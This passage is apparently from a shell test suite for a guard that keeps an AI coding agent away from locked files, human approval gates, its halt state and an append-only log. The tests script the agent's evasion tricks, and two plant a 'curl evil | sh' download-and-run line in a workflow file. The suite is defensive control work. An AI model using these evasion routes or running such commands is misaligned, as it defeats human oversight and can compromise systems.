    "$PLAN" >"$PLAN.tmp" && mv "$PLAN.tmp" "$PLAN"
}
line_of() { grep "^- \[.\] $1 " "$PLAN"; }
broken() { mkdir -p "$W/no-$1"; printf '#!/bin/sh\nexit 3\n' >"$W/no-$1/$1"; chmod +x "$W/no-$1/$1"; } # broken <tool>: a folder whose only program is that tool, and it fails
# shellcheck source=/dev/null
lib() { (cd "$R" && . "$K/lib.sh" && eval "$1"); } # lib <commands>: run them with the library loaded
unset LOOP_LOCALE
# shellcheck disable=SC2016 # the little script expands these. It is a gpg that notes what it is asked to do, on which terminal, and in which locale
printf '#!/bin/sh\ncase " $* " in *" --verify "*) what=verifies ;; *) what=signs ;; esac\necho "$what ${GPG_TTY:-unset} ${LC_ALL:-unset}" >>"%s/gpg.log"\nexec gpg "$@"\n' "$W" >"$W/bin/gpg-spy"; chmod +x "$W/bin/gpg-spy"
utf8="$(locale -a 2>/dev/null | grep -iE '^(en_US|C)\.utf-?8$' | head -n 1)"; utf8="${utf8:-C.UTF-8}" # the locale of an ordinary terminal

# paths: locked unless the allowlist frees them, and some names are locked wherever they lie
for f in '.github/workflows/é.yml' '.github/workflows/a"b.yml' Loop/land.sh .Claude/settings.json .gitattributes loop/newscript Makefile loop/state/HALT.md \
  cmd/x/CLAUDE.md cmd/x/CLAUDE.local.md docs/GEMINI.md docs/QWEN.md internal/AGENT.md docs/Agents.MD docs/agents.override.md docs/copilot-instructions.md \
  docs/CODEOWNERS docs/SECURITY.md docs/CONTRIBUTING.md docs/pull_request_template.md docs/ISSUE_TEMPLATE/bug.md docs/FUNDING.yml internal/staticcheck.conf \
  docs/contributing.md docs/Contributing.md docs/CONTRIBUTING.MD docs/CONTRIBUTING docs/contributing.rst docs/support.md docs/SUPPORT docs/security.md docs/Governance.txt \
  docs/SECURITY.MD docs/Contributing docs/support.txt docs/code_of_conduct.md docs/accessibility.md proposed/SECURITY.md proposed/docs/SECURITY.md docs/security.md.txt Proposed/SECURITY.md.txt \
  cmd/qwen.md cmd/QWEN.MD cmd/NOTES.Md cmd/warp.md cmd/crush.md cmd/iflow.md cmd/codex.md internal/x/skill.md cmd/conventions.md cmd/Qwen.local.md cmd/Claude.mdc cmd/agents.txt cmd/gemini.markdown cmd/AGENTS \
  docs/adr/accepted/003-x.md docs/adr/accepted/deeper/x.md docs/ADR/Accepted/x.md docs/adr/ACCEPTED/x.md \
  internal/.claude/settings.json 'cmd/a b.go' cmd/-rf proposed/.hidden 'loop/::notice::GUARD PASS/x' 'loop/##[error]x' '::notice::GUARD PASS'; do
  nb a; put "$f"; $U; t "locked: $f" 1; said="${said:-}$gout"$'\n'
done
chk "a name cannot speak to the runner" "$(has "$said" '::') $(has "$said" '##\[')" "0 0"
nb a; echo '!loop/private' >>.gitignore; git add -A; $U; t "locked: .gitignore" 1
nb a; echo x >>loop/START-HERE.md; git add -A; $U; t "locked: the guide" 1
nb a; git rm -q loop/gate.sh; $U; t "locked: deleting a script" 1
nb a; chmod +x loop/SPEC.md; git add -A; $U; t "locked: a mode change" 1
nb a; ln -s ../loop/gate.sh cmd/link; git add -A; $U; t "locked: a symbolic link" 1
nb a; git update-index --add --cacheinfo "160000,$base,cmd/sub"; $U; t "locked: a submodule" 1
nb a; printf x >"$(printf 'cmd/a\nb.go')"; git add -A; $U; t "locked: a newline in a name" 1
nb a; mkdir -p "$(printf 'cmd/a\ncmd')"; printf x >"$(printf 'cmd/a\ncmd/b.go')"; git add -A; $U; t "locked: a newline that splits into two plain names" 1
blob="$(echo x | git hash-object -w --stdin)"
twins() { # twins <path> <path> <what> <expected exit>: a commit that holds both. It is made among git's objects and never checked out: a Mac could not hold both as files
  nb a
  t "$3" "$4" "$base" "$(export GIT_INDEX_FILE="$W/twins.index" && git read-tree "$base" && git -c core.ignorecase=false update-index --add --cacheinfo "100644,$blob,$1" --cacheinfo "100644,$blob,$2" &&
    git -c commit.gpgsign=false commit-tree "$(git write-tree)" -p "$base" -m x)"
}
twins docs/Note.md docs/note.md "locked: two names that differ only in case" 1
twins docs/guide docs/Guide/x.md "locked: a file and a directory that differ only in case" 1; chk "and it says so" "$(has "$gout" '(two names that differ only in case) docs/guide')" 1
twins internal/Proxy/a.go internal/proxy/b.go "locked: two directories that differ only in case" 1
twins docs/ADR/003-x.md docs/x.md "locked: a directory that differs only in case from one on main" 1
twins docs/guide.md docs/guide/x.md "(a file and a directory with different names are free)" 0
nb a; : >loop/free-paths.txt; echo x >>loop/SPEC.md; git add -A; $U; t "emptying the allowlist does not help" 1
nb a; echo '^' >>loop/free-paths.txt; echo x >>loop/SPEC.md; git add -A; $U; t "nor does a match-everything line" 1
git checkout -q --orphan a9; git rm -rqf .; put cmd/x.go; $U; t "unrelated history" 1
git checkout -q -f main; loop/guard.sh "$base" 0123456789012345678901234567890123456789 >/dev/null 2>&1; chk "a head that does not exist" $? 1
nb a; gpg --armor --export "$OTHER" >.github/maintainer.asc; echo "$OTHER" >.github/maintainer.fpr; git add -A; git -c user.signingkey="$OTHER" commit -qS -m x -m "$RV"; t "swapping the trusted key" 1
nb a; echo x >>loop/SPEC.md; git add -A; git -c user.signingkey="$OTHER" commit -qS -m x -m "$RV"; t "locked, signed by another key" 1
nb a; echo x >>loop/SPEC.md; git add -A; git commit -qS -m x -m "Locked-paths: none"; t "locked, signed by you, but not as reviewed" 1
nb a; echo x >>loop/SPEC.md; git add -A; git commit -qS -m "$RV" -m "Locked-paths: none"; t "the marker as subject does not count" 1
nb a; echo x >>loop/SPEC.md; git add -A; git -c commit.gpgsign=false commit -qm x -m "$RV"; t "locked, says reviewed, but unsigned" 1
nb a; echo x >>.claude/settings.json; git add -A; $U; git commit -q --allow-empty -S -m ok -m "$RV"; t "an agent commit under a signed empty one" 1
nb a; echo x >>loop/SPEC.md; git add -A; git commit -qS -m x -m "$RV"; t "locked, one commit on the tip, signed as reviewed" 0
nb a; put internal/proxy/p.go 'package p'; put escape/enforced.txt I2; put pins/c.toml; put docs/agents-overview.md; put escape/_pending/S-F1/x_test.go; echo x >>go.mod; echo x >>"$PLAN"; echo x >>"$LOG"; put README.md; $U; t "an ordinary unit" 0
nb a; for f in internal/codex/codex.go internal/adapter/codex.toml internal/adapter/codex_test.go cmd/x/skill.go cmd/warp/main.go internal/agent/agent.go internal/x/security.go internal/x/support.go \
  docs/design/security.md docs/security-review.md docs/supported.md docs/skills.md docs/notes.Md proposed/security.txt; do put "$f"; done; $U; t "names that only resemble the special ones, or lie where nothing reads them" 0
nb a; put proposed/dot-github/workflows/ci.yml; put proposed/CLAUDE.md.txt; put proposed/SECURITY.md.txt; put proposed/CONTRIBUTING.md.txt; put proposed/AGENTS.md.txt; $U; t "proposals" 0
nb a; git rm -rq _legacy; $U; t "deleting _legacy" 0
nb a; put docs/a.md; $U; put docs/b.md; $U; t "two free commits" 0
nb a; chmod +x cmd/workcell/main.go; git add -A; $U; t "a mode change on a free file" 0

# decisions: accepted means that the maintainer moved the file to docs/adr/accepted/, which is locked
adr=docs/adr/accepted/002-workspace-default.md
nb a; LC_ALL=C sed 's/mode is .clone./mode is mount/' "$adr" >x.tmp && mv x.tmp "$adr"; agent "an agent rewrites an accepted decision" 1
nb a; git rm -q "$adr"; agent "deletes it" 1
nb a; git mv "$adr" docs/adr/002-workspace-default.md; agent "moves it out of the folder" 1
nb a; git mv cmd/workcell/main.go docs/adr/accepted/main.go; agent "moves a file of its own into the folder" 1
nb a; put docs/adr/001-vmm.md 'status: accepted'; put docs/adr/003-x.md '**Status:** ACCEPTED (maintainer, 2026-10-31)'; put docs/adr/accepted-by-me.md; agent "outside the folder it may write any status it likes: it means nothing" 0
chk "the filter locks that folder in any capitals by itself, not only as a twin of the one on main" "$(lib "printf 'docs/ADR/Accepted/x.md\0docs/adr/ACCEPTED\0docs/adr/acceptedx\0docs/adr/x/accepted/y.md\0' | guarded" | tr '\n' ' ')" "docs/ADR/Accepted/x.md docs/adr/ACCEPTED "
nb a; put docs/adr/001-vmm.md 'status: proposed'; $U; pbase="$(git rev-parse HEAD)"
git mv docs/adr/001-vmm.md docs/adr/accepted/001-vmm.md; git commit -qS -m x -m "Locked-paths: none"; t "you accept a decision, but not with --reviewed" 1 "$pbase"
git commit -q --amend -S -m x -m "$RV"; t "you accept a decision: git mv, signed as reviewed" 0 "$pbase"

# the plan: gates, and what hangs on them
tick='s/^- \[H\] H-103 /- [x] H-103 /'; gate="$(line_of H-103)" unit="$(line_of U-200)"
nb a; plan "$tick"; agent "an agent ticks a human gate" 1
chk "the line is shown as it was and as it is" "$(has "$gout" '^  (human gate) - \[H\] H-103 ') $(has "$gout" '^  (human gate, new) - \[x\] H-103 ')" "1 1"
nb a; plan '/^- \[H\] H-409 /d'; agent "deletes a human gate" 1
nb a; plan "$tick"; near above '- [H] ID ' "$gate"; agent "ticks it, and parks the old line in the example at the top" 1
nb a; plan "$tick"; printf '\n## Archive\n\n%s\n' "$gate" >>"$PLAN"; agent "or under a new heading at the end" 1
nb a; plan "$tick"; echo "$gate" >>"$PLAN"; agent "or at the end, with no heading" 1
nb a; plan '/^## Cutover$/d'; near above '- [H] H-1015 ' '## Cutover'; agent "moves the Cutover heading above two gates" 1
nb a; plan '/^- \[H\] H-103 /{n;s/accept: .*/accept: nothing/;}'; agent "rewrites what a gate asks for" 1
nb a; plan 's/decided, .clone./decided, mount/'; agent "rewrites a gate that is closed" 1
nb a; near above '- [H] H-409 ' '<!--'; near above '## Phase 5' '-->'; agent "comments a gate out" 1
nb a; near above '- [H] H-409 ' '```'; near above '## Phase 5' '```'; agent "fences a gate off as an example" 1
nb a; near above '- [H] H-409 ' '  ~~~'; near above '## Phase 5' '  ~~~'; agent "or with the other kind of fence" 1
for twin in '- [x] H-409 | env:any | deps:U-403 | done' '* [x] H-409 | done' '-  [x]  H-409 | done' '> - [x] H-409 | done' '1. [x] H-409 | done' '| H-409 | done |' '- [x] **H-409** | done' 'H-409 is closed'; do
  nb a; near above '- [H] H-409 ' "$twin"; agent "gives a gate a ticked twin: $twin" 1
done
nb a; near below '- [H] H-103 ' '      note: closed by the maintainer'; agent "slips a line between a gate and its accept line" 1
nb a; near above '- [x] H-104 ' '      done: 2026-11-02, by the maintainer'; agent "adds a line below a gate's accept line" 1
nb a; near above '## Cutover' '- [H] H-999 | env:any | deps:- | a gate of its own\n      accept: x\n'; agent "adds a gate" 1
nb a; near above '- [H] H-1015 ' '### Cutover'; agent "adds a heading of another level" 1
nb a; plan '/^- \[ \] U-200 /s/deps:H-103/deps:U-103a/'; agent "cuts a unit loose from its gate" 1; chk "and it says which" "$(has "$gout" '^  (gate dependency) U-200 no longer waits for H-103$')" 1
nb a; plan '/^- \[ \] U-700 /s/deps:H-103,/deps:/'; agent "drops one gate from a list" 1
nb a; plan '/^- \[ \] S-1001 /s/deps:above/deps:U-906/'; agent "replaces deps:above" 1
nb a; plan '/^- \[ \] U-201 /{N;d;}'; agent "deletes a unit that waits for a gate" 1
nb a; plan '/^- \[ \] U-200 /s/U-200/U-200z/'; agent "renames such a unit" 1
nb a; plan '/^- \[ \] U-200 /s/deps:H-103/deps:-/'; echo "$unit" >>"$PLAN"; agent "frees a unit, and parks the old line at the end" 1
nb a; near above '- [ ] U-200 ' '* [ ] U-200 | flow:boundary | model:fable | env:kvm | deps:- | tries:0 | the same unit, it seems'; agent "gives a unit a twin that waits for nothing" 1
nb a; plan '/^- \[ \] U-200 /s/deps:H-103/deps:- | deps:H-103/'; agent "gives a unit two deps fields" 1
first="$(line_of S-1001)"; nb a; plan '/^- \[ \] S-1001 /d'; near above '- [H] H-011 ' "$first"; agent "moves a deps:above line up, where fewer gates are above it" 1
nb a; near above '- [ ] U-200 ' "$(printf -- '- [ ] U\342\200\221200 | flow:boundary | model:fable | env:kvm | deps:- | tries:0 | the same unit, it seems')"; agent "a twin whose dash only looks like one" 1
chk "it is shown, with ? for what is not ASCII" "$(has "$gout" '^  (plan, not plain ASCII) - \[ \] U???200 ')" 1
nb a; printf 'a note\000\n' >>"$PLAN"; agent "a NUL byte in the plan" 1; chk "is a reason by itself" "$(has "$gout" '^  (plan) holds a NUL byte$')" 1; nbase="$(git rev-parse HEAD)"
git show "$base:$PLAN" | LC_ALL=C sed "$tick" >"$PLAN"; printf 'a note\000\n' >>"$PLAN"; agent "should such a plan ever reach main, it blinds nothing: a later tick" 1 "$nbase"; chk "is still seen" "$(has "$gout" '^  (human gate) - \[H\] H-103 ')" 1
nb a; plan "$(printf 's/^- \\[H\\] H-103 /- [x] H-103 \377/')"; git add -A; $U; LC_ALL="$utf8" t "a gate line with a byte that is not UTF-8, judged in a UTF-8 locale" 1
nb a; plan 's/^- \[ \] U-003 /- [x] U-003 /; /^- \[ \] U-004 /s/tries:0/tries:1/; s/^- \[ \] U-005 /- [!] U-005 /; s/^- \[ \] W-800 /- [S] W-800 /; /^- \[ \] U-200 /s/tries:0/tries:2/'; agent "honest: ticks, tries, [!] and [S] on units" 0
part='- [ ] U-200a | flow:boundary | model:fable | env:kvm | deps:H-103 | tries:0 | part one\n      accept: x'
nb a; near above '- [ ] U-200 ' "$part"; plan '/^- \[ \] U-200 /s/deps:H-103/deps:H-103,U-200a/'; agent "honest: a split in which every part keeps the gate" 0
nb a; near above '- [ ] U-200 ' "$part"; plan '/^- \[ \] U-200 /s/deps:H-103/deps:U-200a/'; agent "a split in which the last part loses it" 1
nb a; near above '- [ ] S-1001 ' '- [ ] S-1001a | flow:audit | model:fable | env:any | deps:above | tries:0 | part one\n      accept: x'; agent "honest: a split of a deps:above unit" 0
nb a; near above '## Phase 3' '- [ ] U-209 | flow:build | model:sonnet | env:kvm | deps:H-103,U-208 | tries:0 | new work behind a gate\n      accept: x\n- [ ] U-210 | flow:build | model:sonnet | env:any | deps:- | tries:0 | new work\n      accept: y\n'
near above '- [ ] S-1003 ' '- [ ] S-F1 | flow:boundary | model:fable | env:kvm | deps:S-1002 | tries:0 | fix a finding\n      accept: its test passes'; plan '/^- \[ \] U-003 /{n;s/$/. It failed once: no file/;}'; agent "honest: new units, and a remark on a unit's accept line" 0
nb a; plan "$tick"; plan '/^- \[ \] U-200 /s/deps:H-103/deps:-/'; plan '/^## Cutover$/d'; echo '## 2026-10-31T10:15Z - RESUME' >>"$LOG"; git add -A; git commit -qS -m x -m "Locked-paths: none"; t "you do all of that: any signature of yours will do" 0

# the log: append only, and only results of the loop
nb a; echo '## 2026-10-31T10:15Z - RESUME' >>"$LOG"; agent "an agent clears its own halt" 1; chk "and it says so" "$(has "$gout" '^  (resume) ## 2026-10-31T10:15Z - RESUME$')" 1
for h in '- Resume' '- resumed by the maintainer' '- RESTART' '- NOTE' 'U-004 DONE' 'U-004 PASSED' 'U-004' 'u-004 PASS' 'H-103 PASS' 'U-004  PASS'; do
  nb a; echo "## 2026-10-31T10:15Z $h" >>"$LOG"; agent "a heading that is no result of the loop: $h" 1
done
for h in '## 2026-10-31 U-004 PASS' '## U-004 PASS' '##  2026-10-31T10:15Z U-004 PASS' ' ## 2026-10-31T10:15Z - RESUME' '##2026-10-31T10:15Z - RESUME' '### 2026-10-31T10:15Z - RESUME'; do
  nb a; echo "$h" >>"$LOG"; agent "or is not written like one: $h" 1
done
nb a; printf '## 2026-10-31T10:15Z - RESUME\n\000\n' >>"$LOG"; agent "a RESUME line and a NUL byte, which makes git call the log binary" 1; chk "both are named" "$(has "$gout" '^  (log) holds a NUL byte$') $(has "$gout" '^  (resume) ')" "1 1"
nb a; printf '## 2026-10-31T10:15Z \377- RESUME\n' >>"$LOG"; git add -A; $U; LC_ALL="$utf8" t "a RESUME line behind a byte that is not UTF-8, judged in a UTF-8 locale" 1
nb a; printf '## 2026-10-31T10:15Z U-004 PASS mode=cloud \377\n' >>"$LOG"; agent "such a byte in the tail of a heading" 1
nb a; printf '\342\200\213## 2026-10-31T10:15Z - RESUME\n' >>"$LOG"; agent "a RESUME line behind a character of no width" 1
nb a; printf 'all is well\r## 2026-10-31T10:15Z - RESUME\n' >>"$LOG"; agent "a RESUME line behind a carriage return" 1
nb a; for i in 1 2 3 4 5 6; do echo "## 2026-10-31T1$i:15Z U-00$i FAIL mode=cloud model=opus tries=1" >>"$LOG"; done; $U -a; lbase="$(git rev-parse HEAD)"
LC_ALL=C sed '/ U-003 FAIL /d' "$LOG" >x.tmp && mv x.tmp "$LOG"; agent "an agent deletes one of six failures" 1 "$lbase"; chk "and it says which" "$(has "$gout" '^  (log) is append only, but its line [0-9]* was changed or removed: ## 2026-10-31T13:15Z U-003 FAIL ')" 1
git checkout -q -B a "$lbase"; LC_ALL=C sed 's/ U-003 FAIL / U-003 PASS /' "$LOG" >x.tmp && mv x.tmp "$LOG"; agent "turns one into a success" 1 "$lbase"
git checkout -q -B a "$lbase"; LC_ALL=C sed 's/^Append only\./Append mostly./' "$LOG" >x.tmp && mv x.tmp "$LOG"; agent "rewrites the head of the log" 1 "$lbase"
git checkout -q -B a "$lbase"; git rm -q "$LOG"; agent "deletes the log" 1 "$lbase"
git checkout -q -B a "$lbase"; echo '## 2026-10-31T17:15Z U-007 PASS mode=cloud model=opus tries=0' >>"$LOG"; agent "(a success that never happened cannot be told from a real one)" 0 "$lbase"
nb a; printf '%s\n' '## 2026-10-31T10:15Z U-004 START mode=cloud' '## 2026-10-31T11:15Z U-004 PASS mode=cloud model=opus tries=0' 'What changed: the harness.' '' "$(printf 'Learned: 20 \302\265s is enough. # no heading, and\ta tab')" \
  '## 2026-10-31T12:15Z U-204b FAIL mode=cloud model=fable tries=1' '## 2026-10-31T12:20Z S-F12 BLOCKED mode=mac model=fable tries=3' '## 2026-10-31T12:25Z W-800 SPLIT' >>"$LOG"; agent "honest: every kind of result, with the lines below it" 0

# a signature has a short life, so that one you took back cannot be used for ever. The pinned key must be older than the signatures.
now="$(date +%s)"
gpg --batch --quiet --faked-system-time "$((now - 86400))" --passphrase '' --quick-generate-key "aged <aged@example.com>" ed25519 sign never 2>/dev/null; AGED="$(fpr aged 2>/dev/null)"
# shellcheck disable=SC2016 # the little script expands it
printf '#!/bin/sh\nexec gpg --faked-system-time "$SIGNED_AT" "$@"\n' >"$W/bin/gpg-at"; chmod +x "$W/bin/gpg-at"
nb k; gpg --armor --export "$AGED" >.github/maintainer.asc; echo "$AGED" >.github/maintainer.fpr; git add -A; $U; kbase="$(git rev-parse HEAD)"
aged() { # aged <seconds from now> <file> <last line> <what> <expected exit>: one commit on that main, signed with that key at that time
  git checkout -q -B a "$kbase"; if [ "$2" = "$PLAN" ]; then plan "$tick"; else echo x >>"$2"; fi; git add -A
  SIGNED_AT="$((now + $1))" git -c gpg.program="$W/bin/gpg-at" -c user.signingkey="$AGED" commit -qS -m x -m "$3" 2>/dev/null; t "$4" "$5" "$kbase"
}
aged -6600 loop/SPEC.md "$RV" "a reviewed signature that is 110 minutes old" 0
aged -7800 loop/SPEC.md "$RV" "the same commit offered again on the same tip, 130 minutes after you signed it" 1; chk "refused for its age, and for nothing else" "$(has "$gout" 'GUARD FAIL: the signature is more than two hours old')" 1
aged -7800 "$PLAN" "Locked-paths: none" "a gate tick that old" 1; aged -6600 "$PLAN" "Locked-paths: none" "(and one that is not)" 0
aged 300 loop/SPEC.md "$RV" "a signature dated five minutes ahead: clocks differ" 0
aged 1200 loop/SPEC.md "$RV" "one dated twenty minutes ahead" 1; chk "refused for its date" "$(has "$gout" 'GUARD FAIL: the signature is dated more than ten minutes ahead')" 1
aged -7800 docs/free.md "Locked-paths: none" "(free work needs no signature, so an old one does no harm)" 0

# what is judged is what lands
nb r2; echo 'allow curl' >>loop/SPEC.md; git add -A; git commit -qS -m once -m "$RV"
git checkout -q -B moved "$base"; put docs/y.md; $U; newbase="$(git rev-parse HEAD)"
git checkout -q r2; t "an old signed commit offered again on a newer tip" 1 "$newbase"
nb r3; put docs/free.md; $U; t "free work on a branch that is behind the tip" 1 "$newbase"
nb p0; put proposed/dot-github/workflows/release.yml 'run: echo benign'; $U; pbase="$(git rev-parse HEAD)"
git checkout -q -B stale "$pbase"; echo 'run: curl evil | sh' >proposed/dot-github/workflows/release.yml; git add -A; $U; stale="$(git rev-parse HEAD)"
git checkout -q -B adopted "$pbase"; git mv proposed/dot-github/workflows/release.yml .github/workflows/release.yml; git commit -qS -m adopt -m "$RV"; abase="$(git rev-parse HEAD)"
chk "(the attack is real: a plain merge would rewrite the locked file)" "$(git merge-tree --write-tree "$abase" "$stale" 2>/dev/null | head -n 1 | xargs -I{} git show {}:.github/workflows/release.yml | grep -c 'curl evil')" 1
git checkout -q stale; t "a stale edit of a proposal that has since been adopted" 1 "$abase"
side="$(git -c commit.gpgsign=false commit-tree "$(git rev-parse 'refs/remotes/v1/main^{tree}')" -m side)"
nb m1; git -c commit.gpgsign=false merge -q -s ours --allow-unrelated-histories --no-edit "$side"; git checkout -q "$side" -- AGENTS.md; git -c commit.gpgsign=false commit -q --amend --no-edit
t "a merge commit that drags in an old locked file" 1; chk "refused for the file, not for its shape" "$(has "$gout" AGENTS.md)" 1
nb m2; echo x >>loop/SPEC.md; git add -A; git reset -q --hard "$(git commit-tree -S "$(git write-tree)" -p "$base" -p "$side" -m two -m "$RV")"; t "a signed commit with two parents" 1

# every error is a refusal
git checkout -q -f main
mkdir -p "$W/noawk"; printf '#!/bin/sh\nexit 3\n' >"$W/noawk/awk"; chmod +x "$W/noawk/awk"
PATH="$W/noawk:$PATH" loop/guard.sh "$base" "$base" >/dev/null 2>&1; chk "a broken path filter fails the guard" $? 1
nb a; plan "$tick"; git add -A; $U; bad_c="$(git rev-parse HEAD)"; nb a; plan '/^- \[ \] U-200 /s/deps:H-103/deps:-/'; git add -A; $U; bad_d="$(git rev-parse HEAD)"
nb a; echo '## 2026-10-31T10:15Z - RESUME' >>"$LOG"; git add -A; $U; bad_r="$(git rev-parse HEAD)"; git checkout -q -f main
for tool in awk sed sort comm cmp diff tr cut uniq; do
  broken "$tool"
  for head in "$bad_c" "$bad_d" "$bad_r"; do PATH="$W/no-$tool:$PATH" loop/guard.sh "$base" "$head" >/dev/null 2>&1; echo $?; done >"$W/verdicts"
  chk "a tick, a lost dependency and a RESUME line, each judged with a broken $tool" "$(tr '\n' ' ' <"$W/verdicts")" "1 1 1 "
done
broken grep
lib "PATH='$W/no-grep:$PATH'; has_line x <'$K/lib.sh'" 2>/dev/null; chk "has_line with a broken grep: an error, not a no" $? 4
lib "has_line '^has_line' <'$K/lib.sh'"; chk "(a yes" $? 0; lib "has_line '^no such line' <'$K/lib.sh'"; chk "and a no)" $? 1
lib 'printf "a\000b\n## RESUME\n" | has_line "^## RESUME"'; chk "has_line reads on after a NUL byte" $? 0
lib "export LC_ALL='$utf8'; printf '## \377- RESUME\n' | has_line '^##.*RESUME'"; chk "and matches across a byte that is not UTF-8, whatever the locale" $? 0
mkdir -p "$W/spy"; : >"$W/spy.log"
# shellcheck disable=SC2016 # the little scripts expand these
for tool in awk sed sort comm cmp diff tr cut uniq grep; do printf '#!/bin/sh\necho "${LC_ALL:-unset}" >>"%s/spy.log"\nexec "%s" "$@"\n' "$W" "$(command -v "$tool")" >"$W/spy/$tool"; chmod +x "$W/spy/$tool"; done
LC_ALL="$utf8" LANG="$utf8" PATH="$W/spy:$PATH" loop/guard.sh "$base" "$bad_c" >/dev/null 2>&1; chk "every tool runs in the C locale, whatever the caller's" "$(LC_ALL=C sort -u "$W/spy.log")" C
# the runner's clone holds no blobs but those of main: what it lacks it must fetch, and a blob it cannot fetch is not an absent file
nb a; plan "$tick"; git add -A; git commit -qS -m x -m "Locked-paths: none"; tick_c="$(git rev-parse HEAD)"; git push -q origin "HEAD:refs/heads/claude/partial"; git checkout -q -f main
rm -rf "$W/partial"; git clone -q --filter=blob:none -b main "file://$W/origin.git" "$W/partial"; git -C "$W/partial" fetch -q --no-tags origin "$tick_c"; git -C "$W/partial" remote set-url origin "file://$W/nowhere.git"
out="$(cd "$W/partial" && loop/guard.sh "$base" "$tick_c" 2>&1)"; chk "your own tick, but its plan cannot be fetched: refused" $? 1; chk "as an error, not as a plan that is gone" "$(has "$out" 'could not read loop/state/PLAN.md') $(has "$out" '(human gate)')" "1 0"
git -C "$W/partial" remote set-url origin "file://$W/origin.git"; out="$(cd "$W/partial" && loop/guard.sh "$base" "$tick_c" 2>&1)"; chk "(once it can be fetched, it passes)" $? 0; og update-ref -d refs/heads/claude/partial

# ---------------------------------------------------------------- land: your own edits
echo "## land.sh, your own edits"
still_open() { grep -l OPEN "$FAKE"/pr/*/state 2>/dev/null | wc -l | tr -d ' '; }
pf() { out="$("$K/preflight.sh" 2>&1)"; rc=$?; }
# the everyday cases
reset; before="$(og for-each-ref 'refs/heads/mac/*' | wc -l)"
echo note >>docs/notes.md; L n; chk "answering n signs nothing" "$rc" 1; chk "and pushes nothing" "$(og for-each-ref 'refs/heads/mac/*' | wc -l)" "$before"
L y "docs: a note"; chk "a free edit lands" "$(has "$out" LANDED)" 1; chk "with your subject" "$(git log -1 --format=%s refs/remotes/origin/main | grep -c '^docs: a note (#')" 1
chk "the subject was shown before the question" "$(has "$out" '^Subject: docs: a note')" 1; chk "and so was every file" "$(has "$out" 'docs/notes.md')" 1
chk "the pushed commit carried your signature" "$(git verify-commit --raw "$newest" 2>&1 | grep -c "VALIDSIG .*$ME")" 1
chk "signed as touching nothing locked" "$(git cat-file commit "$newest" | tail -n 1)" "Locked-paths: none"
chk "the clone is clean afterwards" "$(git status --porcelain | wc -l | tr -d ' ')" 0
echo x >>docs/notes.md; L y "$(printf 'docs: two lines\n\033]0;of which only the first is plain')"; chk "a subject of two lines is replaced" "$(git log -1 --format=%s refs/remotes/origin/main | grep -c "^loop: change from the maintainer's Mac (#")" 1
chk "so the message holds that subject, the marker, and nothing else" "$(git cat-file commit "$newest" | sed '1,/^$/d' | grep -c .) $(printf '%s' "$out" | grep -c "$(printf '\033')")" "2 0"
echo weak >>loop/SPEC.md; L y; chk "a locked edit needs --reviewed" "$rc" 4
L n --reviewed; chk "--reviewed, answered n" "$rc" 1; chk "it shows the changed line itself" "$(has "$out" '^+weak')" 1; chk "(nothing odd in it, so no warning)" "$(has "$out" '^WARNING') $(has "$out" '^NOTE')" "0 0"
L y --reviewed; chk "--reviewed, answered y" "$(has "$out" LANDED)" 1; chk "signed as reviewed" "$(git cat-file commit "$newest" | tail -n 1)" "$RV"
chk "the kit follows what you signed" "$(tail -n 1 "$K/SPEC.md")" weak; "$K/preflight.sh" >/dev/null 2>&1; chk "so preflight is content at once" $? 0
echo '# ok' >>.github/workflows/ci.yml; L y --reviewed; chk "a workflow file lands: you merge it, not the workflow's token" "$(has "$out" LANDED)" 1
edit 's/^- \[H\] H-011 /- [x] H-011 /' loop/state/PLAN.md; L y; chk "you tick a gate without --reviewed" "$(has "$out" LANDED)" 1; chk "and are told it is yours alone" "$(has "$out" '(human gate)')" 1
out="$(loop/land.sh 2>&1 </dev/null)"; chk "the copy inside the repository refuses" $? 2
ln -s "$R" "$W/lnk"; out="$(cd "$W/lnk" && loop/land.sh 2>&1 </dev/null)"; chk "also when the clone is reached through a link" $? 2
out="$(cd / && LOOP_REPO="$W/lnk" "$W/lnk/loop/land.sh" 2>&1 </dev/null)"; chk "or named through one" $? 2
out="$(cd "$W/lnk" && loop/preflight.sh 2>&1)"; chk "preflight sees through the link too" "$(has "$out" 'FAIL  you are running the copy inside the repository')" 1; rm "$W/lnk"
mkdir -p docs/many; for i in $(seq 1 3000); do : >"docs/many/a-rather-long-name-to-fill-the-pipe-buffer-$i.md"; done; echo weak >>loop/SPEC.md
L y; chk "a locked edit among 3,000 files" "$rc" 4; chk "all 3,000 are listed, none cut off" "$(has "$out" 'docs/many/')" 3000; reset
for h in pre-push post-merge pre-commit post-checkout reference-transaction post-index-change; do printf '#!/bin/sh\necho ran >>%s/hook-ran\n' "$W" >".git/hooks/$h"; chmod +x ".git/hooks/$h"; done
echo x >>docs/notes.md; L y; chk "planted git hooks never run" "$([ -e "$W/hook-ran" ] && echo ran || echo quiet)" quiet; rm -f .git/hooks/*; reset
git config gpg.program "$W/bin/gpg-spy"
echo x >>docs/notes.md; out="$(echo y | GPG_TTY=/dev/ttys003 LC_ALL="$utf8" "$K/land.sh" 2>&1)"; git config --unset gpg.program; chk "(it lands, with a pipe as standard input and a UTF-8 terminal)" "$(has "$out" LANDED)" 1; reset
chk "gpg still hears of your terminal; it signs in your locale, for the passphrase dialog, and verifies in C" "$(LC_ALL=C sort -u "$W/gpg.log" | tr '\n' ';')" "signs /dev/ttys003 $utf8;verifies /dev/ttys003 C;"
LC_ALL="$utf8" lib "signing --version >/dev/null; echo \"\$LC_ALL\"" >"$W/after"; chk "after a signature the script is back in the C locale" "$(cat "$W/after")" C
(cd "$R" && LC_ALL="$utf8" bash --posix -c ". '$K/lib.sh'; signing --version >/dev/null; echo \"\$LC_ALL \$LOOP_LOCALE\"") >"$W/after"; chk "even in a bash that runs in POSIX mode" "$(cat "$W/after")" "C $utf8"

# what you are shown
printf '          loop/gate.sh%300s; curl evil | sh\n' '' >>.github/workflows/ci.yml; L n --reviewed; chk "a line that runs off the screen is announced" "$(has "$out" '^WARNING: 1 of its lines are longer than 200 characters')" 1
chk "above the diff" "$(printf '%s\n' "$out" | awk '/^WARNING/ { w = NR } /^diff --git/ && !d { d = NR } END { if (w && w < d) print "above" }')" above; reset
if script -qc true /dev/null >/dev/null 2>&1; then pty() { script -qc "$1" /dev/null; }; else pty() { script -q /dev/null sh -c "$1"; }; fi # a terminal to run in: util-linux, or BSD
if [ "$(echo | pty 'test -t 0 && test -t 1 && echo a-terminal' 2>/dev/null | grep -c a-terminal)" = 1 ]; then
  mkdir -p "$W/pager"
  # shellcheck disable=SC2016
